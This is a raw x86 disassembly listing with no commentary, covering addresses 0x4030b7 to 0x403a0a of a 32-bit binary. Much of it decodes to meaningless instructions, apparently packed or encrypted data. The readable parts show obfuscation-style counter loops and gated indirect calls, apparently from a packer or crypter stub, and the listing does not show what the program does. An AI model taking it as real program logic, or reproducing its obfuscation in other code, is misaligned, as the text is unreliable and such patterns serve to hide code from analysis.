  4030b7:	fld    QWORD PTR [edi+0x1f]
  4030ba:	fistp  WORD PTR [esi-0x724c8fd]
  4030c0:	pop    esi
  4030c1:	outs   dx,DWORD PTR ds:[esi]
  4030c2:	retf   
  4030c3:	leave  
  4030c4:	dec    esi
  4030c5:	jl     0x403106
  4030c7:	xchg   edi,eax
  4030c8:	mov    esi,0x638bf1f7
  4030cd:	arpl   si,bp
  4030cf:	arpl   WORD PTR [eax],ax
  4030d1:	mov    eax,0x32298ad3
  4030d6:	cs pop esp
  4030d8:	inc    ebx
  4030d9:	inc    esi
  4030da:	dec    esp
  4030db:	fild   QWORD PTR ds:0x7e5d5e24
  4030e1:	into   
  4030e2:	inc    esp
  4030e3:	xchg   ebp,eax
  4030e4:	sbb    bl,ah
  4030e6:	ficom  WORD PTR [ebp+0x6f820cd3]
  4030ec:	stc    
  4030ed:	(bad)  
  4030ee:	jge    0x403087
  4030f0:	fyl2x  
  4030f2:	inc    ebp
  4030f3:	cmp    DWORD PTR [ecx+0x725649d0],eax
  4030f9:	and    al,0xd1
  4030fb:	popa   
  4030fc:	mov    dh,0x82
  4030fe:	test   DWORD PTR [ecx-0x4aba416d],ebp
  403104:	and    ch,0x34
  403107:	jmp    0x4030c4
  403109:	sbb    eax,0x7051cad6
  40310e:	sbb    DWORD PTR [edi],esi
  403110:	sub    ebx,DWORD PTR [edi-0x2cf65dd]
  403116:	mov    dh,0x8b
  403118:	dec    edx
  403119:	test   BYTE PTR [eax+0x37],ch
  40311c:	sbb    ecx,DWORD PTR [ecx-0x38]
  40311f:	add    ebp,DWORD PTR [eax-0x39]
  403122:	(bad)  
  403124:	mov    ds:0x1295a47e,al
  403129:	mov    bh,dh
  40312b:	(bad)  
  40312c:	ss call 0x8afd12b1
  403132:	or     bl,BYTE PTR [ecx+0x4d]
  403135:	pushf  
  403136:	dec    ebx
  403137:	neg    DWORD PTR [eax]
  403139:	ror    BYTE PTR [esi],0x34
  40313c:	call   DWORD PTR [eax-0x2]
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx+0x73bac15c],0x51
  40315f:	xor    edi,DWORD PTR [edx-0x58181e9]
  403165:	jg     0x4031e5
  403167:	jle    0x4031cf
  403169:	push   ebp
  40316a:	mov    DWORD PTR [edx-0x89a0386],esp
  403170:	mov    ah,0x7b
  403172:	xchg   ebp,eax
  403173:	inc    edi
  403174:	inc    ebp
  403175:	(bad)  
  403176:	pop    edi
  403177:	int    0xf8
  403179:	ja     0x4031dc
  40317b:	je     0x4031d2
  40317d:	lods   eax,DWORD PTR ds:[esi]
  40317e:	(bad)  
  40317f:	mov    esi,0xcecd50cf
  403184:	xor    DWORD PTR [ebx+0x52],edi
  403187:	push   ebx
  403188:	jge    0x40312d
  40318a:	mov    esi,0x556b7d3a
  40318f:	inc    ecx
  403190:	mov    ecx,0xa9c2ecf8
  403195:	lock mov ebp,0xfe0feebc
  40319b:	ja     0x40316e
  40319d:	xor    al,BYTE PTR [edx]
  40319f:	jbe    0x40321c
  4031a1:	pop    ebp
  4031a2:	sbb    al,0xa4
  4031a4:	cmp    eax,0xa6c43659
  4031a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031aa:	je     0x4031c0
  4031ac:	ss inc ebp
  4031ae:	adc    eax,0x7ffd331c
  4031b3:	pop    ecx
  4031b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031b5:	sbb    al,0x41
  4031b7:	add    DWORD PTR ds:0xb91e9704,ecx
  4031bd:	adc    bl,bl
  4031bf:	mov    ebp,0xcd9d4b0e
  4031c4:	fwait
  4031c5:	sbb    DWORD PTR cs:[ecx+0x63306d77],0xffffffec
  4031cd:	xchg   edx,eax
  4031ce:	shr    BYTE PTR [edx-0x6a],cl
  4031d1:	jnp    0x4031a6
  4031d3:	test   al,0x1d
  4031d5:	test   BYTE PTR [ebx-0x2],ch
  4031d8:	je     0x403233
  4031da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031db:	mov    ds:0x775878df,al
  4031e0:	imul   ecx,ebp,0x27a2e312
  4031e6:	sbb    al,BYTE PTR [ebx]
  4031e8:	sub    esp,ecx
  4031ea:	adc    dh,dh
  4031ec:	jns    0x403258
  4031ee:	xchg   edx,eax
  4031ef:	in     al,dx
  4031f0:	add    dh,ch
  4031f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031f3:	das    
  4031f4:	mov    ecx,0x2711c701
  4031f9:	lods   al,BYTE PTR ds:[esi]
  4031fa:	xchg   esp,eax
  4031fb:	nop
  4031fc:	into   
  4031fd:	mov    ecx,0x32090747
  403202:	xchg   esi,eax
  403203:	xchg   esi,eax
  403204:	(bad)  
  403205:	jbe    0x403227
  403207:	sahf   
  403208:	dec    ebx
  403209:	(bad)  
  40320a:	jg     0x4031bb
  40320c:	push   ecx
  40320d:	jnp    0x40322b
  40320f:	jp     0x40321e
  403211:	mov    dl,0xf3
  403213:	mov    bl,ah
  403215:	jmp    0xf6ac:0xbd8f0e17
  40321c:	mov    bl,0x81
  40321e:	ret    
  40321f:	sub    ebp,DWORD PTR [ebx]
  403221:	mov    dh,0x35
  403223:	rol    BYTE PTR [eax-0x321c6a38],0xe1
  40322a:	in     al,0x5
  40322c:	ds (bad) 
  40322e:	mov    ebp,0x6c1a854e
  403233:	fldcw  WORD PTR [ecx]
  403235:	sub    eax,0x91e9d83b
  40323a:	jnp    0x403230
  40323c:	cld    
  40323d:	mov    bl,0xda
  40323f:	les    ebx,FWORD PTR [esi]
  403241:	aam    0x26
  403243:	js     0x403206
  403245:	das    
  403246:	repnz and al,0x9c
  403249:	mov    bl,0x25
  40324b:	sti    
  40324c:	pusha  
  40324d:	and    DWORD PTR [eax+0x24198153],ecx
  403253:	hlt    
  403254:	mov    dl,0xb
  403256:	into   
  403257:	push   ebx
  403258:	shl    BYTE PTR [edx],cl
  40325a:	out    dx,eax
  40325b:	sar    BYTE PTR [ecx-0x341e05a1],cl
  403261:	add    edx,DWORD PTR [edx]
  403263:	jnp    0x4032d9
  403265:	retfw  0x52e8
  403269:	aaa    
  40326a:	js     0x403226
  40326c:	pushf  
  40326d:	push   ecx
  40326e:	mov    cl,0x14
  403270:	lods   al,BYTE PTR ds:[esi]
  403271:	test   al,0xb1
  403273:	xor    DWORD PTR [esi+edx*8],esp
  403276:	lds    edx,FWORD PTR [ebx+0x45]
  403279:	jp     0x403273
  40327b:	out    0xb6,al
  40327d:	lds    ebx,FWORD PTR [ebp+0x4620f051]
  403283:	jmp    0xb34d47e8
  403288:	inc    ebx
  403289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40328a:	or     DWORD PTR [eax],esp
  40328c:	push   ebp
  40328d:	test   DWORD PTR [edi],eax
  40328f:	jbe    0x403232
  403291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403292:	adc    eax,0xb7b65818
  403297:	pop    ds
  403298:	mov    WORD PTR [edi-0x1b11b158],fs
  40329e:	cdq    
  40329f:	faddp  st(5),st
  4032a1:	stos   BYTE PTR es:[edi],al
  4032a2:	push   esp
  4032a3:	test   BYTE PTR [edx-0x36d2a907],dl
  4032a9:	mov    bh,0xfb
  4032ab:	mov    bl,dh
  4032ad:	ins    BYTE PTR es:[edi],dx
  4032ae:	mov    ds:0x2a4d8eec,al
  4032b3:	mov    BYTE PTR [ecx+0x40bc3173],cl
  4032b9:	lock push ebx
  4032bb:	mov    edx,0xe145ea6a
  4032c0:	mov    ecx,DWORD PTR [ebp+0x1f37336a]
  4032c6:	pusha  
  4032c7:	xor    ebx,0x31648496
  4032cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ce:	mov    dl,0x65
  4032d0:	mov    ebp,0x7ef8e05d
  4032d5:	xor    edi,DWORD PTR [eax+0x76]
  4032d8:	icebp  
  4032d9:	mov    ?,edx
  4032db:	mov    BYTE PTR [ebp+0x236068fd],0x9a
  4032e2:	lahf   
  4032e3:	popf   
  4032e4:	pop    ecx
  4032e5:	sbb    BYTE PTR [ecx-0x6c],ch
  4032e8:	adc    DWORD PTR [edx],esi
  4032ea:	xchg   edi,eax
  4032eb:	leave  
  4032ec:	pop    esi
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x4337db,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x4337db
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x4337db,ecx
  40331d:	cmp    DWORD PTR ds:0x4337db,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x4337db,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x43386f,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x433857,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43379f
  40336b:	add    DWORD PTR ds:0x433783,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x4337d7,0x1e
  40338b:	cmp    DWORD PTR ds:0x4337d7,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x4337d7,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x4337d7,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x4337d7
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x4337d7,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x4337d7
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x4337d7,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x433867
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x4337c7
  4033f2:	mov    edi,DWORD PTR ds:0x433807
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x4337e7,0x1c
  40340f:	cmp    DWORD PTR ds:0x4337e7,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x4337e7,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x4337e7,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x4337e7
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x4337e7,edi
  40344c:	mov    edi,DWORD PTR ds:0x4337e7
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x4337e7,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x433863
  403467:	and    edx,DWORD PTR ds:0x433897
  40346d:	mov    DWORD PTR ds:0x433863,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43381b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43389f
  40349f:	adc    DWORD PTR ds:0x43377f,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433897,0x10
  4034c6:	cmp    DWORD PTR ds:0x433897,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433897,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433897,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433897
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433897,edi
  403505:	mov    edi,DWORD PTR ds:0x433897
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433897,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x4338ab,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x7b9cd48a]
  403537:	pop    esi
  403538:	xchg   edi,eax
  403539:	(bad)  
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	mov    esp,edi
  403543:	mov    bl,0xd2
  403545:	jle    0x4035ad
  403547:	push   esi
  403548:	xchg   edi,eax
  403549:	js     0x4035bf
  40354b:	pop    edx
  40354c:	aas    
  40354d:	aaa    
  40354e:	sbb    al,0xe8
  403550:	xor    al,0x64
  403552:	bound  ebx,QWORD PTR [esi-0x1d]
  403555:	xor    dh,BYTE PTR [edx]
  403557:	push   edx
  403558:	fucomip st,st(0)
  40355a:	pusha  
  40355b:	das    
  40355c:	bound  ebx,QWORD PTR [esi-0x7a]
  40355f:	cwde   
  403560:	into   
  403561:	test   ebp,esp
  403563:	push   ebx
  403564:	add    esi,DWORD PTR [edi-0x43]
  403567:	cmp    BYTE PTR [ecx],0x89
  40356a:	dec    edi
  40356b:	test   BYTE PTR [edx],ah
  40356d:	mov    bl,ch
  40356f:	dec    ebp
  403570:	mov    ch,0x7e
  403572:	(bad)  
  403573:	push   esp
  403574:	jmp    0x403530
  403576:	rcr    DWORD PTR [ebp-0x63],1
  403579:	mov    edx,ebx
  40357b:	jo     0x4035ea
  40357d:	inc    ecx
  40357e:	adc    al,0x31
  403580:	das    
  403581:	in     al,0xfc
  403583:	xchg   ecx,eax
  403584:	aam    0x8f
  403586:	aad    0xf3
  403588:	sub    BYTE PTR [esp+edx*8-0x70],ch
  40358c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40358d:	adc    BYTE PTR [esi+edi*1-0x31beea7e],dh
  403594:	cmp    eax,0x576606ea
  403599:	mov    dh,0x6f
  40359b:	out    dx,eax
  40359c:	dec    edi
  40359d:	pop    ebx
  40359e:	mov    ds:0x6ac8a134,eax
  4035a3:	inc    ch
  4035a5:	inc    ecx
  4035a6:	aam    0x28
  4035a8:	adc    DWORD PTR [ebx-0x75],ecx
  4035ab:	sub    eax,0xa02fd8ed
  4035b0:	jmp    0x88ca9986
  4035b5:	pop    ebp
  4035b6:	sbb    al,BYTE PTR [ebp-0xa2c4c05]
  4035bc:	mov    bh,0xda
  4035be:	jmp    0x2380:0x5906d693
  4035c5:	in     eax,0x35
  4035c7:	adc    eax,0xde135007
  4035cc:	pusha  
  4035cd:	nop
  4035ce:	cdq    
  4035cf:	mov    ds:0xdaac2829,al
  4035d4:	sbb    ebx,DWORD PTR [ebx+0x1a]
  4035d7:	xchg   BYTE PTR [ecx+0x46],bh
  4035da:	mov    DWORD PTR [ebx],0x6d61b236
  4035e0:	repnz sub bh,BYTE PTR ss:[edx+0x19d79c52]
  4035e8:	lahf   
  4035e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035ea:	data16 mov WORD PTR [edi-0xb27a99b],cs
  4035f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035f2:	lods   eax,DWORD PTR ds:[esi]
  4035f3:	xor    dh,dh
  4035f5:	push   ss
  4035f6:	sti    
  4035f7:	dec    ebx
  4035f8:	mov    dh,0xe8
  4035fa:	push   eax
  4035fb:	sub    eax,0x417f8fff
  403600:	jl     0x40366c
  403602:	in     eax,dx
  403603:	or     eax,0xc6edf641
  403608:	push   esp
  403609:	repz inc ecx
  40360b:	mov    al,0xc
  40360d:	xchg   esp,eax
  40360e:	ins    BYTE PTR es:[edi],dx
  40360f:	fiadd  DWORD PTR [ecx+0x5a5fb0bd]
  403615:	and    dl,BYTE PTR es:[eax]
  403618:	(bad)  
  403619:	mov    esp,0x810bac52
  40361e:	repz push cs
  403620:	js     0x4035f2
  403622:	(bad)  
  403623:	aaa    
  403624:	sbb    al,0xc4
  403626:	(bad)  
  403627:	inc    esp
  403628:	mov    ebx,0x4adba6d
  40362d:	ret    
  40362e:	fstp   TBYTE PTR [edi+0x4847f582]
  403634:	retf   
  403635:	loopne 0x40362e
  403637:	pop    ecx
  403638:	shl    edx,0x1d
  40363b:	ficom  WORD PTR [ecx-0x3f07867d]
  403641:	push   0xffffff85
  403643:	loope  0x403677
  403645:	in     eax,dx
  403646:	push   cs
  403647:	lea    eax,[ebx]
  403649:	mov    al,ds:0x426017b
  40364e:	xor    al,0xd9
  403650:	mov    eax,DWORD PTR [ebx]
  403652:	popf   
  403653:	xchg   DWORD PTR [ebx],ebp
  403655:	pop    ecx
  403656:	arpl   WORD PTR ds:0xeedc75e9,si
  40365c:	add    al,0x90
  40365e:	xchg   ebx,eax
  40365f:	stc    
  403660:	sbb    DWORD PTR [ebx],eax
  403662:	inc    edi
  403663:	stc    
  403664:	jno    0x403606
  403666:	push   es
  403667:	adc    esp,0x6284e352
  40366d:	add    al,BYTE PTR [ebx]
  40366f:	inc    edi
  403670:	dec    edi
  403671:	out    0x9,eax
  403673:	gs (bad) 
  403675:	pushf  
  403676:	retf   0x2419
  403679:	lods   eax,DWORD PTR ds:[esi]
  40367a:	jae    0x40369a
  40367c:	mov    al,0x62
  40367e:	nop
  40367f:	ja     0x4036f1
  403681:	(bad)  [ebx]
  403683:	xor    DWORD PTR [ebx-0x469a8e11],0x9cb0d7b3
  40368d:	daa    
  40368e:	cmc    
  40368f:	xor    eax,0x47c7000c
  403694:	fldcw  WORD PTR [esi+0x74]
  403697:	fadd   st,st(7)
  403699:	adc    BYTE PTR [ebx+esi*4],dh
  40369c:	adc    dl,dh
  40369e:	jmp    DWORD PTR [ecx]
  4036a0:	aam    0xeb
  4036a2:	or     DWORD PTR [edi],edi
  4036a4:	test   DWORD PTR [edi+0x24],0x1cefe437
  4036ab:	nop
  4036ac:	push   edx
  4036ad:	or     DWORD PTR [edx+ebp*4],ebp
  4036b0:	imul   ebp,DWORD PTR [ebx],0x6c
  4036b3:	push   eax
  4036b4:	jno    0x40369b
  4036b6:	loop   0x403645
  4036b8:	cmp    al,0x31
  4036ba:	popa   
  4036bb:	or     esp,DWORD PTR [edx]
  4036bd:	cmp    dh,BYTE PTR [edi]
  4036bf:	inc    esp
  4036c0:	stc    
  4036c1:	mov    BYTE PTR [eax+0x20],ch
  4036c4:	out    dx,al
  4036c5:	push   0x2e
  4036c7:	shl    BYTE PTR [edi-0x65],0x3e
  4036cb:	ret    0xa7e
  4036ce:	xor    cl,BYTE PTR [eax*8+0x3f491b95]
  4036d5:	loop   0x4036ad
  4036d7:	nop
  4036d8:	cdq    
  4036d9:	out    0xd4,eax
  4036db:	or     BYTE PTR [ebx+0x3cc0a10b],bl
  4036e1:	push   ebp
  4036e2:	sbb    DWORD PTR [eax+esi*4-0x52d7f6d6],esi
  4036e9:	div    ebp
  4036eb:	(bad)  
  4036ec:	das    
  4036ed:	mov    DWORD PTR [ebp+0x21],ebp
  4036f0:	cmc    
  4036f1:	adc    ch,ah
  4036f3:	inc    edi
  4036f4:	adc    al,BYTE PTR [ebp-0x372f19bd]
  4036fa:	ins    DWORD PTR es:[edi],dx
  4036fb:	cmp    esp,DWORD PTR [edi]
  4036fd:	adc    BYTE PTR [esi],0x72
  403700:	dec    ebp
  403701:	fadd   QWORD PTR [edi]
  403703:	jnp    0x4036cd
  403705:	fisttp DWORD PTR [edx-0x28886f08]
  40370b:	mov    al,0xa5
  40370d:	rol    DWORD PTR [ecx+0x4573d7ae],0xab
  403714:	push   eax
  403715:	ret    0x69e4
  403718:	pop    edx
  403719:	fs pushf 
  40371b:	shl    eax,0xc3
  40371e:	jmp    0x70c3:0xf235d93b
  403725:	xor    ebp,DWORD PTR [ecx]
  403727:	inc    ecx
  403728:	add    eax,0xce072e07
  40372d:	or     al,0x66
  40372f:	adc    al,0xeb
  403731:	loopne 0x4037a3
  403733:	mov    ebp,0x3074c930
  403738:	pop    eax
  403739:	lods   eax,DWORD PTR ds:[esi]
  40373a:	in     al,0xb5
  40373c:	dec    esi
  40373d:	push   esi
  40373e:	lea    ecx,[esi-0x66]
  403741:	push   ebx
  403742:	inc    edx
  403743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403744:	test   ah,dl
  403746:	je     0x4037b0
  403748:	mov    cl,0x68
  40374a:	xor    al,0xa8
  40374c:	xor    BYTE PTR [esi+0x721c489d],cl
  403752:	dec    esp
  403753:	push   esp
  403754:	inc    esp
  403755:	xor    dl,BYTE PTR [ebx+ebx*2]
  403758:	aam    0xc
  40375a:	mov    ebx,0x94aa13e4
  40375f:	dec    ecx
  403760:	cld    
  403761:	lea    eax,fs:[ebx-0x37a4a316]
  403768:	fs push ecx
  40376a:	pushf  
  40376b:	adc    al,BYTE PTR [ecx]
  40376d:	mov    esi,0x242d4b1c
  403772:	mov    BYTE PTR [ebp+esi*1+0x3f72739d],cl
  403779:	jl     0x403741
  40377b:	not    bl
  40377d:	inc    edi
  40377e:	inc    eax
  40377f:	cwde   
  403780:	inc    ecx
  403781:	(bad)  
  403783:	out    0xf6,eax
  403785:	pop    edx
  403786:	mov    WORD PTR [ebp+0x79fa7a0e],ds
  40378c:	hlt    
  40378d:	std    
  40378e:	fsub   DWORD PTR [esp+ebx*1+0x75]
  403792:	fs adc al,0x8f
  403795:	inc    esp
  403796:	push   0x74df5ecf
  40379b:	cdq    
  40379c:	dec    ebp
  40379d:	bound  esp,QWORD PTR [esp+edx*2+0x74]
  4037a1:	lods   eax,DWORD PTR ds:[esi]
  4037a2:	imul   esi,DWORD PTR [esi],0x223aff2c
  4037a8:	jg     0x40381f
  4037aa:	inc    DWORD PTR [edi]
  4037ac:	or     eax,DWORD PTR [ecx-0x6c]
  4037af:	push   ebx
  4037b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037b1:	xor    eax,0xa892b902
  4037b6:	sar    dh,1
  4037b8:	not    DWORD PTR [ecx-0xa]
  4037bb:	test   BYTE PTR [esi-0x15a58c74],0x69
  4037c2:	adc    ebp,esi
  4037c4:	cmp    eax,0x9e46ea55
  4037c9:	(bad)  
  4037ca:	andps  xmm4,XMMWORD PTR [edi+0x6b]
  4037ce:	and    DWORD PTR [esi],eax
  4037d0:	aas    
  4037d1:	xchg   edi,eax
  4037d2:	cli    
  4037d3:	retf   
  4037d4:	stos   BYTE PTR es:[edi],al
  4037d5:	cmp    DWORD PTR [edi+eax*1+0x20],ecx
  4037d9:	and    BYTE PTR [ebp-0x1f],0xfb
  4037dd:	lods   eax,DWORD PTR ds:[esi]
  4037de:	push   es
  4037df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037e0:	pop    edi
  4037e1:	jnp    0x4037d8
  4037e3:	jle    0x4037fb
  4037e5:	das    
  4037e6:	cmp    eax,0xcbe9ec7
  4037eb:	retf   
  4037ec:	out    dx,eax
  4037ed:	xchg   edi,edx
  4037ef:	clc    
  4037f0:	cmp    DWORD PTR [esp+edi*2],ecx
  4037f3:	mov    DWORD PTR [ebx-0x622b4d54],ebp
  4037f9:	fmul   st,st(1)
  4037fb:	ret    
  4037fc:	scas   al,BYTE PTR es:[edi]
  4037fd:	or     edx,DWORD PTR [esi-0x15064226]
  403803:	out    0xcf,al
  403805:	mov    esp,0x35c16147
  40380a:	mov    edi,0x52a1b5cd
  40380f:	cmp    eax,0xb737a51a
  403814:	add    edx,DWORD PTR [edi-0x4d35d847]
  40381a:	xchg   esi,eax
  40381b:	dec    esi
  40381c:	cmp    DWORD PTR [esi-0x4177fb6a],eax
  403822:	xlat   BYTE PTR ds:[ebx]
  403823:	mov    edx,0xc7be40d0
  403828:	inc    ebp
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x377b3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	sub    edi,DWORD PTR [eax]
  40383b:	inc    ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x4338a725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x4338a7
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x4338a7,edi
  403858:	cmp    DWORD PTR ds:0x4338a7,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x4338a7,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x4338a7
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x4338a7,edi
  40389c:	cmp    DWORD PTR ds:0x4338a7,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x4337eb,0x4338ab
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433813,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x43386b,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x4338a7,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x43386b,0x43382b
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x43377b,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433797,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433793,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43389b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x43377f,0x1d
  403935:	cmp    DWORD PTR ds:0x43377f,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x43377f,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x43377f,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x43377f
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x43377f,ebx
  403985:	mov    ebx,DWORD PTR ds:0x43377f
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x43377f,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x4337e7
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433793
  4039a6:	sub    edi,DWORD PTR ds:0x4338a3
  4039ac:	mov    DWORD PTR ds:0x433793,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433787,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433787,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433787,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433787
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433787,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433797
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x43377b,0x0
  403a0a:	xor    ebx,ebx
